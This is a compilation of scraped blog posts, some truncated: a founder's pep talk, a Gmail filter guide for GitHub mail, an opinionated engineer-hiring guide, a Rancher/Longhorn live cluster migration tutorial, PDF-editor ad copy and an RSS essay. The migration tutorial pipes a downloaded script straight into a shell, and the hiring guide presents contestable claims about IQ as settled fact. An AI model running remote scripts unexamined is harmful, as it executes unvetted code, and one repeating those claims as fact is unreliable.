	You’ll have people telling you you cannot do things- hell sometimes you’ll even realize the tech industry is slightly sexist and for the first time in your life you’ll understand you’re a girl; you’ll understand time and time again you know nothing, and you’ll doubt your ability or strength to do this (aren’t there more suitable people than me to do this? Am I really the one?). So you need balls- balls to power through your own mental downfalls and the ones others put you through along this journey. You need balls to fail- the small fails that come weekly, and the impending fear that you’ll fail altogether. You need balls to create a new world- it is terrifying, but who else is going to do it if not yourself?     </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	What I learnt is that I cannot wallow, I cannot waddle, I cannot flinch. I cannot be afraid of making mistakes- if you’re going to do this, you have to be full on, drive straight through fearlessly, adapt and become at every single stage of it. 
    </p>
</div>
<!-- /module plain text --><!-- module plain text -->

<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	this is about you as much as it is about your startup- if you wanted it to not be about you, you would’ve joined one of the existing systems, but here you are, getting ready to walk your own road and build your own world.     </p>
</div>
<!-- /module plain text --><!-- module plain text -->
<div>
        <p>
	I would like to end by extending my support/ brainstorming power/ resources to anyone that needs it. No shame- if you need to speak I’m here, as a just-one-step-ahead mentor and always as a friend.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <p>A fair share of my waking hours involves communicating with other people on GitHub to make sure we’re solving the right problems, and that we’re solving them the right way.</p>

<p>As a result, I receive many email notifications about various things that happen on there: <span>direct requests to review a particular piece of code</span>, <span>feedback on pull requests I’ve opened</span>, <span>pull requests merged by their authors</span>, <span>people directly mentioning our username in a comment</span>, <span>issues closed by their authors</span>, etc. I receive hundreds of emails every single week.</p>

<p>Now here’s the thing: some of these emails are more time-sensitive and/or actionable than others. We should probably address <span>direct requests to review a particular piece of code</span> first, since someone is explicitly asking for our attention and not responding promptly would likely prevent them from shipping something swiftly. Conversely, I’ll want to delete (or at least deprioritize) email notifications communicating that a given <span>pull request was merged by its author</span> - there’s no actionable to derive from it, so in the bin it goes.</p>

<p>However, by default, all these email notifications arrive in our inboxes with the same perceived level of importance, which makes it difficult to identify what I should address next.</p>

<p><strong>This post presents a solution to this problem</strong>: using Gmail filters, we can automatically add labels to GitHub notification emails based on their content. This solution takes less than 10 minutes to implement, and the long-term return on investment is quite appreciable.</p>

<p>Here’s how my inbox looks like with automatic labeling set up:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/b5eb240fc484167ca5540f1786e678940a18c70d/19b6a/assets/github-labels.png" alt=""></p>

<p>Pretty neat, right? Thanks to these labels, I’m able to quickly parse through emails and reach inbox zero every day.</p>

<p>Let’s see how to implement this solution with Gmail.</p>

<h2 id="1-download-the-xml-filters-template">1. Download the XML filters template</h2>

<span>&lt;/feed&gt;</span>
</code></pre></div></div>

<h2 id="2-edit-the-template-with-your-information">2. Edit the template with your information</h2>

<p>In the template, replace the following string:</p>

<ul>
  <li><code>@&lt;YOUR_GITHUB_USERNAME_HERE&gt;</code> (in my case that would be <code>@maximevaillancourt</code>)</li>
</ul>

<p>If you’re part of a GitHub team that other people mention in issues and pull requests, also replace the following string:</p>

<ul>
  <li><code>@&lt;YOUR_GITHUB_TEAM_NAME_HERE&gt;</code> (for example, <code>@my-organization/best-team-ever</code>)</li>
</ul>

<p>If you’re not part of a GitHub team, remove the <code>&lt;entry&gt;</code> node that looks for this pattern.</p>

<p>Finally, save the XML file.</p>

<h2 id="3-import-the-xml-filters-in-gmail">3. Import the XML filters in Gmail</h2>

<p>Now that your template is ready, it’s time to import it in your Gmail account.</p>

<p>Open up your Gmail settings, and click on the “Filters” tab. Once you’re there, find the “Import filters” link near the bottom of the pane. Select the XML file you just modified and upload it. Review the filters and and confirm the import.</p>

<p>That’s it - you’re done. At this point, your emails should be labeled automatically. Feel free to change the colors of the labels via the “Labels” tab in your Gmail settings. I find it helpful to make <span>direct review requests</span> red as this means “urgent and important” to me, and the label for <span>merged pull requests</span> is green because it means “success, everything’s good” to me.</p>

<p>Experiment to find what works best for you.</p>

<p>If you found this helpful, consider sharing it with your coworkers and friends. I’m always available on Twitter (<a href="https://twitter.com/vaillancourtmax">@vaillancourtmax</a>) to discuss. ✌️</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This is my super secret proprietary no-nonsense guide on how to interview engineers. <em>Another</em> guide? Yes, because today's interviews are filled with posturing, political correctness, and small socially convenient falsehoods that have everything to do with large company recruiting constraints and nothing to do with you. Microsoft started it, FAANG cloned it, and everyone else cloned FAANG. If you're basing your interviews on industry standard practices, you're now three levels of <a href="http://calteches.library.caltech.edu/51/2/CargoCult.htm">cargo-culting</a> deep.</p><p>This guide is for interviewing very talented people. It's applicable if you're building an extraordinary team at a hard technology startup. If your startup is technology-enabled, or you're designing an interview process at a large company, or you're hiring for well-established roles to do specialized tasks, this guide isn't for you. You will not find references to "junior vs senior" or "front-end vs back-end" here. From the perspective of what we're trying to accomplish, specialization is for insects.</p><p>There are three things you need to determine about a candidate: talent, judgement, and personality. Think of hiring an engineer as if you're buying a race car. The first thing you must look for in a race car is horsepower, because without horsepower the car is useless for racing. The horsepower of engineers is talent. Without talent, engineers are useless for building products, so it's the first thing you must look for in a candidate. It doesn't matter how nice the person is, or how hard-working. No horsepower, no race.</p><p>Talent alone is insufficient. The world is filled with talented people who never get anywhere for a myriad reasons. Laziness, anxiety, fragility, impulsivity, egotism, victimhood, just to list a few. So once you've identified talent, you have to determine the shape and quality of its vessel. Where will the person direct their talent? And are they well-adapted to the demands of the external world?</p><h4>Talent</h4><p>Talent is a combination of speed, working memory, taste, knowledge of the toolchain, understanding how computers work, and ability to program. It's IQ, but specialized for engineers. IQ is <a href="https://en.wikipedia.org/wiki/Heritability_of_IQ">50-80% heritable</a>, <a href="https://www.gwern.net/Drug-heuristics">impossible to improve</a>, <a href="https://en.wikipedia.org/wiki/IQ_classification">normally distributed</a>, and <a href="https://infoproc.blogspot.com/2008/07/annals-of-psychometry-iqs-of-eminent.html">strongly correlated</a> with success in fields like science and engineering.</p><p>This matters for candidate selection because someone can improve within their talent band, but they can't jump talent bands. A person with IQ of 145 (σ=3) is dramatically better than a person with IQ of 115 (σ=1). If you watch both people work, it's like they're from different galaxies. So your job as an interviewer is to find out the candidate's talent band.</p><p>Here's how you do that. Tell the candidate in advance to have a laptop with their favorite development environment ready. They can use any operating system, any editor, any programming language— whatever makes them the most comfortable.</p><p>When the interview starts, have them share the screen. You'll be watching as they type. Then, give them a problem. The one I gave for years is to write a program that plays every possible tic-tac-toe game, and then prints the number of valid games. You should make up your own problem, but this is roughly the difficulty you're shooting for, give or take. The candidate's goal is to write the program, compile it, run it, and get it to produce the correct answer.</p><p>Take note of the time and let them do their thing. Answer any questions they might have as they go. The moment the program outputs the correct answer, take note of the time again. That's all you have to do to evaluate how talented the candidate is. The technical aspect of the interview is over. (Yes, you read that right!)</p><p>Here is what will happen. The most talented candidates will think about it for a few seconds, then write the program as fast as they can type (and they'll type fast). You can almost sense their frustration because they think way faster than the keyboard allows them to interface with the computer. Typing speed is their bottleneck. When they're done typing, they'll probably have a few compiler errors and runtime bugs that they'll fix instantly. Have them compare their result with the answer on Google. If the answers don't match, they'll look at the program for a few seconds, exclaim "oh, right!", fix the bug, rerun the program and get the correct answer. The whole process will take about 10 minutes from start to finish.</p><p>Slightly less talented candidates will do the same thing, but a little slower. You'll get a sense that their thinking speed and typing speed are balanced— neither is the bottleneck. They might take a bit longer to iron out the bugs and spot the mistake if the program doesn't give the correct answer the first time they run it. They'll get the whole thing done in 15 minutes. Maaaybe 20, if they're having a bad day.</p><p>The rest of the candidates will type much more slowly than they normally could. They're capable of much faster typing speed, but the speed of their thinking is the bottleneck. For our purposes, that's a no hire. When you sense that, let them keep working for 15 minutes to save face, then politely interrupt them, thank them for their time, and hang up. The silver lining of the pandemic is that you no longer have to be in a situation where you find out five minutes into the interview the candidate isn't good, and then waste everyone's time for a few more hours because it's too awkward to send them home.</p><p>Note that this interview question covered everything we defined as talent— speed, working memory, knowledge of the toolchain, understanding how computers work, and ability to program. To evaluate taste you have to pay attention to their code, choice of tools, and the thinking process as they write the program. But you could probably ignore all that. I've never met a candidate who could solve this problem in less than 15 minutes but had no taste. Like IQ, the various aspects of talent that you want in a candidate tend to be tightly correlated. When they have a couple of desired qualities in abundance, they usually have the rest.</p><h4>Aside</h4><p>Let me pause for a moment and answer a few frequently asked questions.</p><p>First, I cannot myself pass this interview. Last time I tried, I got the correct answer after about forty minutes or so. I could get it down with practice, but it doesn't matter-- I think slower than I type. That's a no hire. The point of the interview is to hire extremely talented engineers, not engineers as talented as me.</p><p>Second, algorithms questions are currently out of fashion, timing the candidate is downright blasphemous, and untimed work-specific questions are in vogue. Instead of asking the candidate to solve a programming problem like above, you're supposed to ask them to glue APIs together, and to take as long as they need. There are all sorts of very good arguments for why you should do this, all of which remind me of the following quote by Deirdre McCloskey in her essay <a href="https://www.deirdremccloskey.com/docs/graham/natural.pdf">The Natural</a> (which, by the way, is excellent and you should read):</p><blockquote><p>Richard Bower is an economist right down to his wing tip shoes. He knows Sophocles and Shakespeare alright, but he believes in economics. […] Give him any social situation, from insider trading to an obstreperous teenage child, and he looks to economics for an answer, or at least for a good running start.</p></blockquote><p>The economics answer is that people switched interview styles right in the middle of a tech boom when demand for software engineers dramatically exceeded supply, and then made up a bunch of reasons for why the new way of interviewing is better than the old way. FAANG companies hire entire engineering armies every year. No recruiting organization can sustain that without lowering the bar. But unlike managers at FAANG, your compensation doesn't depend on team size and you're not hiring bodies just to fill seats. When you need very talented people to join you, you must do the grueling, unscalable work to find and recruit them.</p><p>Third, system design and architecture questions are useful for candidates that think slower than they type. For exceptional people these types of questions are a waste of time. I've never met anyone able to write a complex program as fast as they can type but unable to figure out that they need a load balancer, or how to set one up on AWS.</p><h4>Judgement</h4><p>Judgement tends to be weakly correlated with talent, and comes down to this: there is a difference between a tinkerer and an engineer. They're close, but they aren't the same thing. Tinkering is building a Rube Goldberg machine for the sheer delight of building it. Engineering is discovering and satisfying (often unintuitive) constraints. The tinkerer works for the machine. The engineer makes the machine work for him.</p><p>Most engineers aren't tinkerers, they're in it for the money. Don't hire those because they have no soul and hanging around them will slowly poison your own soul by osmosis. Conversely, many tinkerers aren't engineers. Don't hire those either, because they'll build beautifully complex structures that serve no purpose other than their own existence. You want people who take great delight in building Rude Goldberg machines, but balance it with a broader sense of what they're trying to accomplish.</p><p>Another way of thinking about it is that talent is a combination of general aptitude and programming tactics. Judgement is programming strategy.</p><p>You don't need every engineer on your team to be Sun Tzu, but you do need them to have one of two qualities. Either the candidate should have good strategic intuition, or, at a minimum, they must be aware that strategy exists and be willing to acquiescence to someone with better judgement. The worst case scenario is a candidate with awful strategic intuition, but who thinks he's good. They'll end up wasting everyone's time in pointless discussions, and eventually will get disgruntled and quit.</p><p>How do you test for judgement? One school of thought is to ask the candidate a revealing set of questions. This is the "what are your weaknesses" question, version 2.0. Industry …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>One of the many benefits of Kubernetes that I often hear people talk about is <b>portability</b>. Kubernetes makes it possible to migrate workloads from a cluster to another easily, and this can be useful if for example a company wants to change infrastructure provider due to cost or any other reason.<false></false></p>
<p>While there are various ways one can migrate workloads from a cluster to another, how to do it actually depends on where and how the clusters are provisioned (e.g. if with the same provider or not). In most cases the easiest option is to back everything up on the old cluster, and restore in the new cluster before making the switch. This implies a certain amount of downtime depending on the apps and data to migrate. I have done this several times using <a href="https://velero.io/" target="_blank">Velero</a>﻿, a free, popular backup tool for Kubernetes. Migrating with zero downtime is certainly a more complex task.</p>
<p>I was bored so I did a fun experiment doing a <b>live</b>&nbsp;migration (as opposed to backup followed by a restore) of a cluster from <a href="https://www.hetzner.com/cloud" target="_blank">Hetzner Cloud</a>﻿ to <a href="https://www.digitalocean.com/" target="_blank">DigitalOcean</a>﻿, but where your nodes are actually hosted doesn't really matter if you do the migration the way I did.&nbsp;</p>
<p>To design a cluster in such a way that it would be possible to migrate it live to some other infrastructure even totally different, you need to take into account some limitations.&nbsp;In particular, your cluster cannot use features that are specific to cloud providers such as load balancers and block storage; also, you cannot use private networks because of course nodes in two different environments would not be able to communicate each other - unless you set up some kind of VPN or similar.</p>
<p>What I used for this test instead is my favorite Kubernetes tool:&nbsp;<a href="https://rancher.com/" target="_blank">Rancher</a>﻿. If you've happened to read this blog before you probably know that I absolutely love Rancher. It makes deploying and managing Kubernetes a lot easier, especially for a team of one like me.</p>
<p>In a previous post I wrote on <a href="https://vitobotta.com/2020/03/20/haproxy-kubernetes-hetzner-cloud/">how to set up a highly available load balancer with haproxy and keepalived</a>﻿ (see also the article I wrote for the Hetzner Community on <a href="https://community.hetzner.com/tutorials/howto-highly-available-load-balancer-hetzner-cloud-ansible" target="_blank">how to automate the same thing with Ansible</a>﻿), so I set up load balancers this way. For the sake of simplicity, I will skip that part in this post and just use a regular ingress connecting directly to a node.</p>
<p>For the storage instead, I used another project by Rancher, <a href="https://longhorn.io/" target="_blank">Longhorn</a>﻿. Longhorn is awesome in that it offers many features like a great dashboard, backups to S3/NFS and DR, and is open source and totally free. Longhorn also makes it incredibly easy to move volume replicas between nodes so it's a great fit for this experiment.</p>

<h2>Prerequisites</h2>
<p>For this post, I assume you </p>
<ul>
<li>are already familiar with Kubernetes, so if you are looking for an introduction to it this isn't the right post :)&nbsp;</li>
<li>are already familiar with Rancher. If not, you can anyway set it up easily by following <a href="https://rancher.com/docs/rancher/v2.x/en/installation/" target="_blank">the official documentation</a>﻿. After that it's a very intuitive graphical UI</li>
<li>have an account with a couple of cloud providers or anyway access to two different infrastructures where you can create some instances. Which providers you use doesn't really matter.</li>
</ul>

<h2>Creating the first cluster in Hetzner Cloud</h2>
<p>To get started, head to the Hetzner Cloud console (you can use the CLI&nbsp;if you prefer) and create three servers so we can test with a HA cluster. I called my nodes <i>hc-node1..3.&nbsp;</i>﻿Choose Ubuntu 18.04 or another OS&nbsp;supported by Rancher, and ensure that the servers have 2-3 cores and 2-4 GB&nbsp;of ram each.<i></i><false></false></p>
<p>Once the servers are up and running, SSH into them and update system packages, configure firewall etc if you wish (you may not need this if you are just testing this migration).</p>
<p>We have only two requirements concerning the software installed in the nodes. The first is Docker, which you can install with the following command:</p>
<pre><code>﻿curl -fsSL https://get.docker.com | sh</code></pre>
<p>The second requirement is open-iscsi, which is required by Longhorn:</p>
<pre><code>apt install open-iscsi -y</code></pre>
<p>We can now proceed with provisioning Kubernetes with Rancher. From the "Global"&nbsp;view, click "Add Cluster" and select the custom nodes option:</p>
<div><div><figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcXNPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--bb675cee8474aac635e568d74213a00f520aa5bf/rancher-new-cluster-custom-nodes.jpg" data-image="839"></figure></div></div>
<p>Give the cluster a name such as "test" and choose Weave as the network provider:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcXdPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--22baffc04eb9c00a6181716cd02d77a87f27cdaa/rancher-select-cni-plugin.jpg" data-image="840"></figure><p>You don't have to use Weave for this test, but in a real life scenario you should use a CNI&nbsp;plugin that enables encryption between the nodes since we are going to connect them to each other via the public Internet.</p>
<p>Click "Next", then select all the roles for the nodes and copy the provided Docker command:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcTBPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--11eee1104482af76e517c00c63b8427226214bd9/rancher-custom-nodes-docker-command.jpg" data-image="841"></figure><p>Then run that Docker command on each node. After a few seconds, the UI will report "3 new nodes have registered". Click "Done", then click on the name of the cluster from the list, then click on the "Nodes" tab to see the provisioning progress.&nbsp;</p>

<h2>Preparing the nodes in DigitalOcean</h2>
<p>The provisioning of Kubernetes will take several minutes, so in the meantime you can start preparing the nodes in DigitalOcean since the objective of this test is to migrate the cluster later.</p>
<p>So go ahead and create three droplets with at least 2 cores and Ubuntu 18.04 as the OS.</p>
<p>Install Docker and open-iscsi as explained earlier. The nodes are now ready.</p>

<h2>Installing Longhorn</h2>
<p>When Kubernetes provisioning is complete, the nodes will be marked as "Active" like in the picture below:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcTRPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--5f3f0374a7441ac02861e8776a018407de16e957/rancher-cluster-ready.jpg" data-image="842"></figure><p>Now from the top menu click on "test" (or whatever name you gave to the cluster), then "System", the click on the "Apps" tab.&nbsp;</p>
<p>Click on "Launch", search for Longhorn and click on it. Launch with the default settings, and wait - the installation will take a couple of minutes and you will see the progress bar. When green, Longhorn should be ready to provision storage. Double check by clicking on "Resources" &gt; "Workloads" and scrolling to the "longhorn-system"&nbsp;namespace. You will see the same resources as in the picture below:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcThPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--e9dd15be1b778d683a2c7153ed4ded121c1f2224/rancher-longhorn-installation-complete.jpg" data-image="843"></figure><p>Click again on the "Apps"&nbsp;tab and you'll notice a link to "/index.html" in the Longhorn card. Click on that link to securely access the Longhorn dashboard:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBckFPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--dc7a3ee776b0c06a000dc0bdc5f6474d96bbbb98/longhorn-dashboard.jpg" data-image="844"></figure><p>Now go to the "Node" tab and ensure that all the nodes are schedulable:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBckVPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--443e66387d27c4ecacb25af000d81fcfc21e3e96/longhorn-node-tab.jpg" data-image="845"></figure><p>By default, Longhorn will use the available storage on the nodes to provision persistent volumes, so you don't need to configure or install anything else.</p>
<p>Click on the "Volume"&nbsp;tab and keep it open so we can check later when volumes are created.</p>

<h2>Installing an example workload - Magento</h2>
<p>To test the migration, we'll deploy Magento as an example workload that uses two persistent volumes, one for Magento itself and the other for MariaDB.&nbsp;</p>
<p>So from the top menu go to "test" &gt; "Default" &gt; "Apps" and search for Magento. Click on the only result, configure username and password you'll use to access the app, and make sure persistent volumes are enabled both for Magento and MariaDB like in the picture:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcklPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--c5de92546ff514eb0771332f479204d232397ec4/rancher-magento-pvc-settings.jpg" data-image="846"></figure><p>You don't need to select a storage class since Longhorn's is set as default.</p>
<p>Set "Magento Host URL" to "magento.&lt;ip of a node&gt;.xip.io"&nbsp;so we don't have to configure some DNS somewhere. Any hostname for the xip.io domain that includes an IP address will resolve to that IP&nbsp;address, which is handy for tests.</p>
<p>Under "Hostname" click on "Specify a hostname to use"&nbsp;and enter the same hostname as for the previous step, then click "Launch".</p>
<p>Now go back to the "Volume"&nbsp;tab of the Longhorn UI and see that the volumes are created. It may take a little while for the Magento volume since the container image is a little large.</p>
<p>When the Magento and MariaDB&nbsp;pods are up and running open the hostname you configured earlier in the browser and ensure that the app works as expected.</p>

<h2>Migrating the cluster live</h2>
<p>So far we have a working Kubernetes cluster with a real life workload that uses persistent volumes, in Hetzner Cloud. Let's now migrate the cluster to DigitalOcean.</p>
<p>From the top menu in Rancher click on the project title, then click on "Edit Cluster". Scroll to the bottom, and you will see a familiar form:&nbsp;select all the roles for the new nodes, copy the Docker command and this time run that command on the <b>DigitalOcean nodes</b>﻿ that you prepared earlier.<b></b><false></false></p>
<p>Click on "Save" then on the "Nodes" tab and wait for the nodes to be "Active". It's gonna take several minutes and at the end you will have six active nodes:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBck1PIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--02f90cb73c6a3b354f98258e9f1798b61c0e6d76/all-nodes-active.jpg" data-image="847"></figure><p>We need to migrate both the persistent volumes and the workloads from the Hetzner Cloud nodes to the DigitalOcean nodes, so select the Hetzner Cloud nodes (hc-node1..3) and then click on "Cordon". Go to the Longhorn "Node" tab and verify that the Hetzner Cloud nodes are no longer schedulable for the storage.</p>
<p>Click on the "Volume"&nbsp;tab, then click on the first volume. You should see the current three replicas of the volume on the Hetzner Cloud volumes:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBclVPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--127d6b9c0950b58c2acda0b11f075167876e5aee/longhorn-volume-replicas.jpg" data-image="849"></figure><p>Click on the small drop down at the top right corner of the "Replicas" section and click on&nbsp;"Update Replicas Count". Set it to 6 and confirm. Longhorn will now create a new replica on each of the only schedulable nodes, which are the DigitalOcean ones. Wait until the new replicas are ready (blue background and "Running" status). Then set the replica count back to 3 and delete the replicas on the Hetzner Cloud nodes, so that only the replicas on the DigitalOcean nodes remain.</p>
<p>Ensure the status of the volume on the left is "Healthy", and repeat the same process with the second volume.</p>
<p>Once all the volume replicas have been migrated, ensure that Magento is still working. At this point we have the pods in Hetzner Cloud and the data in DigitalOcean. Magento should work exactly as before, just a little slower due to the higher latency.</p>
<p>Next, go to the "Nodes" tab in Rancher, select the Hetzner Cloud nodes and click on "Drain" with the options configured like in the picture to speed up the draining:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBclFPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--7d3010d13a7c54daec89b0b5502dd25fe38692cd/rancher-drain-node.jpg" data-image="848"></figure><p>Wait until the Hetzner Cloud nodes are marked as "Drained", then check that the Magento and MariaDB pods have been rescheduled on the DigitalOcean nodes. If the pods don't get recreated because the volumes cannot be attached, schedule the deployments to 0 and back to 1. Sometimes it can take a little while to reattach the volumes. Check that Magento is still working.</p>
<p>Go to the "Apps" tab, click on the three dots in the Magento card and …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><h2>Add text to PDF like a business professional</h2><p>People judge books by their covers, and that is true for the digital world too. Your document format speaks volumes before the eyes ever glaze the title. In a business setting, If you’re not using PDF, you’re guilty of amateurism until proven otherwise. That’s why HR departments, Startup founders, freelancers, and rising talents add text to PDF to exchange serious communication.</p><h2>Write on PDF to stay organized and productive</h2><p>Typing on a PDF was always a troublesome task that would often end up with a call to the IT department. And that’s just awful. You’re losing both the time and mental bandwidth to do the actual work. Also, people in IT probably dislike your face if you’re nagging them to be your PDF editor.</p><p>‍<br>Choose a PDF document that needs extra words, and upload it to Good Annotations. Then, focus on your title, subtitle, text body, and callouts for important elements. Let the IT side and geeky tasks to us! </p><h2>Use red callouts to edit pdf for immediate attention</h2><p>The PDF editor comes with an array of tools that will help you add text to pdf. Once your file is online, choose the red text note, and draw attention in a mannered and robust way, without sounding unhinged with all caps or exclamation marks. Nobody likes to be screamed at through the screen. With the right callout, you can communicate in a robust and impactful way via your pdf documents. </p><h2>Add yellow callouts to PDFs for vibe and appreciation</h2><p>Bring out the right vibe with the right note. Nothing speaks,<em> I appreciate you</em>, better than an energetic yellow note under a well-done task. Your team members, employees, and employers all seek affirmation and appreciation. Tell them what’s good by adding a yellow callout to your PDF document.</p><h2>Add text to PDF with an entirely online PDF editor</h2><p>You don’t have to be boxed at your desk with your back bent and face inched away from the screen.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h4>Or, What RSS Gets Right</h4>
<p>Abraham Lincoln once said, "<a href="https://en.wikipedia.org/wiki/Marshall_McLuhan">The medium is the message</a>. And San Francisco summers are cold af."</p>
<p>Putting that aside, I've been thinking a lot (uh-oh) about why I like opening up my RSS reader app so much. And I'm not <em>just</em> talking about its looks, even though it's super cute (I'm using the free, open-source, and all-around neato <a href="https://ranchero.com/netnewswire/">NetNewsWire</a> for my RSS needs).</p>
<p>No, I'm talkin' about them RSS <em>feels</em>.</p>
<p>Why does using opening my RSS inbox feel so much better than typing in gmail.com or tapping the iMessages icon or, heavens forbid, opening up Twitter?</p>
<p>With my sweet-sweet RSS, there's no anxiety. There's no guilt. In our time-tracking Screen Time home screen widget era, there's almost a baccanalian decadance to sifting through an RSS inbox, like watching honey drip from one of those wooden combs in a cereal commercial. Or -- back when we were allowed -- going to the library and reading the newspaper from those weird wooden dowels.</p>
<p>It should go without saying that this feeling does not extend to the other inboxen in my life. And I'd like to understand why -- and see if I can do anything about it.</p>
<h2>A framework for messages</h2>
<p>Butchering some data pipeline terms, let's define an inbox (e.g. email, social media, text messages, RSS, phone calls) as a sink for messages from various data providers, where these messages wait for human-in-the-loop processing (in this case, you).</p>
<p>O! Ye of little time! How are you meant to evaluate the "importance" of a given message? Let's explore that across two vectors: (1) prior awareness of the message's sender and (2) usefulessness of the message contents.</p>
<p><span>

  </a>
    </span></p>
<p>The sweet-spot is that upper row: useful messages from both "people we know" and "people we don't know." Whereas if you're in the bottom row, you're gonna have a bad time: useless messages are never... useful.</p>
<h4>Filtering on sender</h4>
<p>The bottom right quadrant is easy to visualize: robo-calls about your non-existent car's expired warranty, social media ads, junk mailers in your meatspace mailbox. </p>
<p>You might think, perhaps, that we can use the "Expected Sender" vs "Unexpected Sender" filter to avoid this quadrant. In fact, this is what Apple allows you to do with the new <a href="https://support.apple.com/en-us/HT207099#:~:text=To%20turn%20on%20Silence%20Unknown,in%20your%20recent%20calls%20list.">Silence Unknown Callers</a> feature in iOS 14 (which doesn't actually prevent the calls, but immediately sends unknown calls to the dead-letter queue that is your voicemailbox).</p>
<p>The problem with this blunt approach of dead-letter queueing the right column is that you're going to miss the serendipity of the upper right quadrant: calls from unexpected sources with useful information. Given <a href="https://www.charlieharrington.com/colon-cancer">my recent cancer diagnosis</a>, I've had tons of important, useful calls from unknown numbers every single day, from doctors and the like -- calls that I want to triage quickly. Sending all calls from unknown numbers straight to voicemail would just be yet another inbox to maintain. Worse, I might miss something important in the upper right quadrant.</p>
<p>A lighter touch approach here is to auto-classify your messages into buckets based on sender. Gmail now does this with their "Primary", "Social", and "Promotion" tabs. Everything's still "in your inbox", but now you can usually just "Select all" on that Promotion tab and safely send those messages straight to the netherworld.</p>
<p>The bottom left quadrant is where your unique lifeforce is slowly chipped away, doomscrolling through your high school classmates' life updates or, gasp, political views. Don't get me wrong -- I really enjoy Instagram and it makes me happy to see people I know doing cool, cute stuff. But I know it can get real bad in this quadrant real quick. Unfollowing and/or muting is key here.</p>
<h4>Filtering on content</h4>
<p>Okay, so, if filtering on sender alone doesn't work, can we use the message contents to figure out if a given message is going to be useful?</p>
<p>We're now talking about <em>pre-processing</em> the messages in our queues.</p>
<p>In the days of future past, you might have employed a staffer to "sort through your office mailbox" to do this. How very Don Draper of you. But in today's era of secure password managers and 2FA, we ideally don't have <em>that many</em> other people in our digital inboxes. The inbox providers are aware of this, and they're starting to provide some tools to help here -- as long as you're okay with them "reading" your messages.</p>
<p>Gmail, for example, has gotten pretty darn good at spam detection. They're "reading your emails" and dropping the bad ones into your "spam folder" dead-letter queue. Maybe, once in a blue moon, they false-positive something that you have to go spelunking into that elephant graveyard to find. But I'm never annoyed by this, because when I see absolute garbage that they've blocked for me day-in and day-out, I'm hashtag grateful again.</p>
<p>This approach, however, isn't possible with all mediums. There's no way to pre-filter on content for an incoming phone-call, for example.</p>
<p>And the tradeoff in pre-filtering on content is, of course, privacy. </p>
<p>If you're down for your inbox provider to "scan" your messages, then they can potentially start to do some smart stuff, like "bubbling up" useful messages or getting rid of bottom row crud.</p>
<p>But, more likely than not, they're also reading them for another purpose.</p>
<h4>The cost of free</h4>
<p>Many of these inbox platforms are free (e.g. social media, Gmail), and someone's gotta pay to keep that spam algorithm ticking. And that someone is you.</p>
<p>Most ads are squarely in the bottom right quadrant. "Good" ads -- I'm talking about those Instagram candles you keep converting on -- are upper right quadrant. The platforms do their darndest to make sure their ads are as upper-right as possible, but they can't guarantee that. YouTube keeps asking me my age because it's genuinely confused as to why my viewing habits fluctuate between watching someone clean old Apple II and VIC-20 computers and the latest Super Mario 3 speed-runs. </p>
<p>And, c'mon, I'd rather just not ever see ads in the first place.</p>
<p>Okay, tough guy. Are you willing to pay for an ad-free inbox then?</p>
<p>Maybe? Ugh. Yes, there's a bunch of new players in the space who are emphasizing privacy and going ad-free. But am I going to willingly add yet another recurring subscription to my life? The Mandalorian is about to come back, and I'm already bracing for the impending Disney+ subscription. </p>
<p>I'll come back to this, because our analysis is still missing two important features.</p>
<h2>A framework for inboxen</h2>
<p>So, far we've only explored the features of an individual message -- not the nature of an inbox itself.</p>
<p>Regardless of an individual message's usefuless or your prior awareness of its sender, an inbox has two other important features that contribute to our mental well-being: (1) typical message volume and (2) expected urgency of triage.</p>
<p><span>

  </a>
    </span></p>
<p>The message volume thing is straightforward. Some platforms have a never-ending feed of messages that you can "enjoy," others not so much.</p>
